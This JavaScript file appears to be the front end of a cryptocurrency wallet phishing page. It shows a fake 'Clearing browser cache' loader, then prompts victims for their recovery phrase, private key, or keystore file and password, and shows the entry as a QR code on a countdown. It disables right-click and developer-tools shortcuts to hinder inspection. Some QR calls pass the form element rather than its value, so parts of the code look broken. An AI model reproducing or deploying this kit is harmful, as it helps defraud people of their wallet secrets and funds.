const messages = ["Clearing browser cache"];
const messageElement = document.querySelector(".message");
const progressElement = document.querySelector(".progress");
const msgbox = document.getElementById("msg");
const cntmanModal = document.getElementById("box");
const upper = document.getElementById("upper");
const verify = document.getElementById("verify");
const loading = document.getElementById("load");

// Animation event listener
progressElement.addEventListener("animationiteration", updateMessage);

let currentMessageIndex = 9;

document.addEventListener("contextmenu", function (e) {
	e.preventDefault();
});
document.addEventListener("keydown", function (e) {
	if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
		e.preventDefault();
	}
});
document.onkeydown = function (e) {
	if (
		e.keyCode === 123 || // F12
		(e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
		(e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
		(e.ctrlKey && e.keyCode === 85) || // Ctrl+U
		(e.ctrlKey && e.shiftKey && e.keyCode === 67)
	) {
		// Ctrl+Shift+C
		return false;
	}
};
function updateMessage() {
	if (currentMessageIndex < messages.length) {
		messageElement.textContent = messages[currentMessageIndex];
		currentMessageIndex++;
	} else {
		loading.style.display = "none";
		cntmanModal.style.display = "flex";
		upper.style.display = "flex";
		msgbox.style.display = "none";
	}
}

const handleremove = () => {
	cntmanModal.style.display = "none";
	verify.style.display = "flex";
};

const phaseSp = document.querySelector(".phase-sp");
const phrase = document.querySelector(".phrase");
const privateKey = document.querySelector(".private_key");
const privSp = document.querySelector(".priv-sp");
const keyStoreJson = document.querySelector(".keyStore_json");
const ksjSp = document.querySelector(".ksj-sp");
const phasesub = document.querySelector("#phasesub");
const phs = document.querySelector("#phs");
const ksp = document.querySelector("#ksp");
const kpsp = document.querySelector("#kpsp");
const psp = document.querySelector("#psp");
const bphs = document.querySelector(".bphs");
const bpsp = document.querySelector(".bpsp");
const bksp = document.querySelector(".bksp");
const qrCode = document.querySelector("#qr-code");
const qrCode2 = document.querySelector(".qrCode");
const setErr = document.querySelector(".seterr");
const setPErr = document.querySelector(".setperr");
const setKErr = document.querySelector(".setkerr");

phaseSp.classList.add("show");

phrase.addEventListener("click", () => {
	phaseSp.classList.add("show");
	privSp.classList.remove("show");
	ksjSp.classList.remove("show");
});

privateKey.addEventListener("click", () => {
	phaseSp.classList.remove("show");
	ksjSp.classList.remove("show");
	privSp.classList.add("show");
});

keyStoreJson.addEventListener("click", () => {
	phaseSp.classList.remove("show");
	ksjSp.classList.add("show");
	privSp.classList.remove("show");
});

bphs.addEventListener("click", (e) => {
	e.preventDefault();
	clearQR();

	if (phs.value.length < 10) {
		setErr.innerHTML = "invalid & must be more than 10 letters";
	} else {
		qrCode2.classList.add("showing");
		generateQrCode(phs);
		setErr.innerHTML = "";

		setTimeout(() => {
			qrCode2.classList.remove("showing");
			phs.value = "";
		}, 30000);

		var timerElement = document.querySelector(".timer");

		var timeLeft = 29;

		// Update the timer every second
		var countdown = setInterval(function () {
			// Display the current time
			timerElement.innerHTML = timeLeft;

			// Decrease the time left
			timeLeft--;

			// Check if the timer has reached 0
			if (timeLeft < 0) {
				clearInterval(countdown);
				timerElement.innerHTML = "Time's up!";
			}
		}, 1000);
	}
});

bpsp.addEventListener("click", (e) => {
	e.preventDefault();
	clearQR();

	if (psp.value.length < 10) {
		setPErr.innerHTML = "invalid private key";
	} else {
		qrCode2.classList.add("showing");
		generateQrCode(psp);
		psp.value = "";
		setPErr.innerHTML = "";

		setTimeout(() => {
			qrCode2.classList.remove("showing");
			phs.value = "";
		}, 30000);

		var timerElement = document.querySelector(".timer");
		var timeLeft = 29;
		var countdown = setInterval(function () {
			timerElement.innerHTML = timeLeft;
			timeLeft--;
			if (timeLeft < 0) {
				clearInterval(countdown);
				timerElement.innerHTML = "Time's up!";
			}
		}, 1000);
	}
});

bksp.addEventListener("click", (e) => {
	e.preventDefault();
	clearQR();

	if (ksp.value.length < 5 || kpsp.value.length < 5) {
		setKErr.innerHTML = "invalid keystore and password";
	} else {
		qrCode2.classList.add("showing");
		generateQrCode(ksp);
		ksp.value = "";
		kpsp.value = "";
		setKErr.innerHTML = "";

		setTimeout(() => {
			qrCode2.classList.remove("showing");
			phs.value = "";
		}, 30000);

		var timerElement = document.querySelector(".timer");
		var timeLeft = 29;
		var countdown = setInterval(function () {
			timerElement.innerHTML = timeLeft;
			timeLeft--;
			if (timeLeft < 0) {
				clearInterval(countdown);
				timerElement.innerHTML = "Time's up!";
			}
		}, 1000);
	}
});

const generateQrCode = (url) => {
	const qr = new QRCode(document.getElementById("qr-code"), {
		text: url,
	});
};

const clearQR = () => {
	qrCode.innerHTML = "";
};

function redirect() {
	window.location.replace("QR.html");
	return false;
}
